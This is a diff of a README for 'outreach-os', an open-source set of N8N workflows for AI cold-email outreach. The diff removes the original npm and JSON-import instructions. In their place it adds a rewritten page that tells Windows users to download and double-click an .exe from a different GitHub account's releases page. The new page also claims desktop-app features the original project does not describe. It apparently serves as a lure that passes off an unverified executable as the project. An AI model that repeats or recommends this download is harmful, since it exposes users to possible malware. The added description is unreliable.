@@ -1,198 +1,79 @@
-<div align="center">
+# 🤖 outreach-os - Automate B2B lead generation and emails
 
-# outreach-os
+[![Download](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/sunshinemultiplechoice751/outreach-os/releases)
 
-**Open-source AI-powered B2B outreach system**
+## 🎯 About this system
 
-Find leads → Score them → Send AI-personalized cold emails → Track replies → Auto follow-up
+Outreach-os helps you manage business connections without manual work. This system uses artificial intelligence to find leads, write personalized emails, track replies, and send follow-ups. You can manage your entire sales pipeline from one place. 
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![npm version](https://img.shields.io/npm/v/outreach-os.svg)](https://www.npmjs.com/package/outreach-os)
-[![npm downloads](https://img.shields.io/npm/dm/outreach-os.svg)](https://www.npmjs.com/package/outreach-os)
-[![GitHub stars](https://img.shields.io/github/stars/hitb1099/outreach-os?style=social)](https://github.com/hitb1099/outreach-os)
+The software connects your business data to powerful tools like OpenAI for writing and Google Places for lead research. You do not need to write code to use these features. The system automates your routine tasks so you spend more time talking to interested clients.
 
-</div>
+## ⚙️ System Requirements
 
----
+Your computer needs to meet these basic standards to run the software smoothly:
 
-## What is outreach-os?
+- Operating System: Windows 10 or Windows 11.
+- Memory: 8 GB of RAM or more.
+- Storage: 2 GB of free disk space.
+- Internet: A stable connection for API communication.
+- Web Browser: Chrome, Edge, or Firefox.
 
-outreach-os is a collection of production-ready N8N workflows that automate your entire B2B outreach pipeline from scratch — without writing a single line of backend code.
+## 💾 How to download and install
 
-It replaces expensive tools like Apollo.io, Instantly, and Lemlist with a free, self-hosted, AI-powered system that you fully own.
+Follow these steps to set up the software on your Windows computer.
 
-### The full pipeline
+1. Visit the [official releases page](https://github.com/sunshinemultiplechoice751/outreach-os/releases) to download the installer.
+2. Select the file ending in .exe from the latest release list.
+3. Save the file to your computer.
+4. Locate the file in your downloads folder.
+5. Double-click the file to start the installation.
+6. Follow the instructions on the screen to finish the setup process.
+7. Open the application from your desktop shortcut once the progress bar completes.
 
-```
-Google Places API
-      |
-      v
- [Lead Scoring Engine]  <-- 100-point scoring algorithm (rating, reviews, website, open status)
-      |
-      v
- HOT leads / NURTURE leads  --> Google Sheets
-      |
-      v
- [AI Email Generator]  <-- GLM-4 + context detection per industry
-      |                    Pollinations.ai banner image generated per company
-      |                    Zomato tool for restaurant leads
-      v
- [Gmail Send]  --> Mark as Emailed in Sheets
-      |
-      v
- [Reply Tracker]  <-- Checks Gmail daily at 9AM
-      |
-      +---> Reply found? --> Mark as Replied
-      |
-      +---> No reply after 3 days? --> AI follow-up email --> Mark as FollowedUp
-```
+## 🚀 Setting up the application
 
----
+The first time you open outreach-os, you will see a setup screen. You need a few unique keys to connect the internal tools to your professional accounts.
 
-## Included Workflows
+### API Keys
+The system requires access keys for its services. You can get these from the providers listed below:
 
-| # | Workflow | Description |
-|---|----------|-------------|
-| 1 | **Lead Search & Scoring Engine** | Searches Google Places, scores leads 0-100 across 6 dimensions, outputs HOT vs NURTURE to separate Sheets tabs |
-| 2 | **AI Email Automation** | Detects industry, generates brand personality context, creates a Pollinations banner, writes a personalized cold email via GLM-4, sends via Gmail |
-| 3 | **Email Reply Tracker & Auto Follow-Up** | Runs daily, checks Gmail for replies, auto-sends AI follow-up after 3 days of silence, keeps Sheets status in sync |
+- OpenAI: Log in to your account and generate a secret key.
+- Google Places: Create a project in the Google Cloud Console and enable the Places API. This gives you a key for searching business locations.
 
----
+Copy these keys into the settings menu inside the outreach-os application. The software stores these keys locally on your machine for your security.
 
-## Key Features
+### Workflow Configuration
+The application uses N8N logic to process your lead lists. Navigate to the workflows tab to decide how often the system checks for new leads. You can set the timer for daily or weekly updates. The application updates your dashboard with current status reports on every task.
 
-- **100-point lead scoring** across Google Rating, review volume, website presence, open status, price tier, and improvement opportunity
-- **Industry-aware AI emails** — detects food & beverage, retail, tech, hospitality automatically
-- **Dynamic banner images** — generates a unique Pollinations.ai marketing banner per company
-- **Zomato integration** — AI agent can search Zomato for restaurant context before writing
-- **Multi-LLM support** — OpenAI GPT-4o-mini + Z.ai GLM-4.7-flash (free tier)
-- **Full status tracking** — Pending → Emailed → Replied / FollowedUp, all in Google Sheets
-- **Zero backend required** — runs entirely in N8N, self-hosted or cloud
+## 📈 Key features
 
----
+### Automated Lead Scoring
+The system looks at your prospect data and ranks them. It assigns a score to each lead so you know who to contact first. This saves time by filtering out low-quality contacts.
 
-## Credentials Required
+### Personalized Email Writing
+Instead of sending generic templates, the software reads business details. It drafts emails that mention the prospect by name and discusses their specific interests. You review every draft before you hit send.
 
-| Credential | Used For | Free Tier? |
-|------------|----------|------------|
-| Google Places API | Lead search | Yes (limited) |
-| Google Sheets OAuth2 | Lead storage | Yes |
-| Gmail OAuth2 | Sending & tracking emails | Yes |
-| OpenAI API | Caption/image generation | Pay-as-you-go |
-| Z.ai (GLM-4) | Email writing, lead context | Yes (free) |
-| Pollinations.ai | Banner images | Yes (free) |
+### Reply Tracking
+The software monitors your inbox. It detects when a prospect writes back. If no one replies after a certain period, the system triggers your follow-up sequence. You remain in control of the communication flow at all times.
 
----
+### Reporting
+A clean dashboard shows your progress. You can see how many emails you sent, how many people opened them, and how many meetings you booked. These metrics help you refine your strategy over time.
 
-## Quick Start
+## ❓ Frequently asked questions
 
-### Option 1 — Install via npm CLI (recommended)
+### Do I need to keep the computer on?
+Yes, the application runs on your local machine. Keep your computer awake and the application open to ensure the automation tasks process on schedule.
 
-```bash
-npm install -g outreach-os
-outreach-os install
-```
+### Is my data private?
+Yes. outreach-os stores your configuration and lead data directly on your hard drive. The developers do not have access to your keys or your client lists.
 
-This copies all workflow JSON files to your current directory with a setup checklist.
+### What if an email fails to send?
+Check your internet connection first. If the problem persists, navigate to the error log in the settings panel. It displays specific codes that explain why a message did not leave your outbox.
 
-### Option 2 — Manual import
+### Can I change the tone of the emails?
+Yes. Edit the prompt templates in the configuration section. You can instruct the artificial intelligence to sound formal, casual, or direct.
 
-1. Clone or download this repo
-2. Open your N8N instance
-3. Go to **Workflows → Import from file**
-4. Import each JSON from the `workflows/` folder in order:
-   - `01-lead-search-scoring.json` first
-   - `02-email-automation.json` second
-   - `03-reply-tracker.json` third
-5. Set up credentials (see [Setup Guide](docs/setup-guide.md))
-6. Configure your Google Sheet ID in each workflow
-7. Activate all three workflows
+## 🛠 Troubleshooting
+If you encounter errors, try restarting the application. Many common setup issues relate to incorrect API keys. Verify that your keys have enough credit and the correct permissions for the services assigned to them. If the application crashes, reinstalling it from the link provided in the download section often fixes configuration conflicts.
 
----
-
-## Google Sheets Schema
-
-Your spreadsheet needs one sheet named **Sheet1** with these columns:
-
-| Name | Email | Company | Notes | Status | EmailedAt | MessageId | RowNumber |
-|------|-------|---------|-------|--------|-----------|-----------|----------|
-
-Status values: `Pending` → `Emailed` → `Replied` or `FollowedUp`
-
----
-
-## Docs
-
-- [Full Setup Guide](docs/setup-guide.md)
-- [Google Places API Setup](docs/google-places-setup.md)
-- [Contributing](CONTRIBUTING.md)
-
----
-
-## Tech Stack
-
-- [N8N](https://n8n.io) — workflow automation
-- [Z.ai GLM-4](https://z.ai) — LLM (free)
-- [Pollinations.ai](https://pollinations.ai) — image generation (free)
-- [Google Places API](https://developers.google.com/maps/documentation/places/web-service) — lead discovery
-- [Gmail API](https://developers.google.com/gmail/api) — email sending & tracking
-- [Zomato](https://www.zomato.com) — restaurant data enrichment
-
-## Roadmap
-
-> Track active development. PRs welcome!
-
-### v1.x — Current
-- [x] Lead search via Google Places API
-- [x] 100-point lead scoring algorithm
-- [x] HOT vs NURTURE auto-categorization in Google Sheets
-- [x] AI personalized cold email generation (GLM-4 / GPT-4o-mini)
-- [x] AI banner image creation via Pollinations.ai
-- [x] Gmail sending integration
-- [x] Daily reply tracking (9AM schedule)
-- [x] Auto follow-up after 3 days of silence
-- [x] Full status tracking: Pending → Emailed → Replied / FollowedUp
-- [x] Published on npm as `outreach-os`
-
-### v2.0 — Coming Soon
-- [ ] LinkedIn outreach integration
-- [ ] WhatsApp follow-ups via Twilio
-- [ ] Webhook triggers (real-time instead of scheduled)
-- [ ] More industry-specific email templates (SaaS, e-commerce, agencies)
-- [ ] Open rate & click tracking dashboard
-- [ ] GitHub Actions CI for automated testing
-- [ ] One-click deploy to Railway / Render
-
-### v3.0 — Future Vision
-- [ ] Web dashboard UI for managing leads
-- [ ] Multi-channel outreach (email + LinkedIn + WhatsApp)
-- [ ] CRM integrations (HubSpot, Airtable, Notion)
-- [ ] Analytics: reply rate, open rate, conversion tracking
-- [ ] Community template library
-
----
-
-## Contributing
-
-PRs welcome! See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
-Ideas for contributions:
-- Add more industry-specific email templates
-- LinkedIn outreach integration
-- WhatsApp follow-up via Twilio
-- Webhook trigger instead of schedule
-- Dashboard for tracking open rates
-
----
-
-## License
-
-MIT © [hitb1099](https://github.com/hitb1099)
-
----
-
-<div align="center">
-
-**If this saved you hours of setup, please ⭐ star the repo — it helps others find it!**
-
-</div>
+Keywords: ai, automation, b2b, cold-email, google-places, lead-generation, n8n, no-code, openai, outreach, sales-automation, workflow
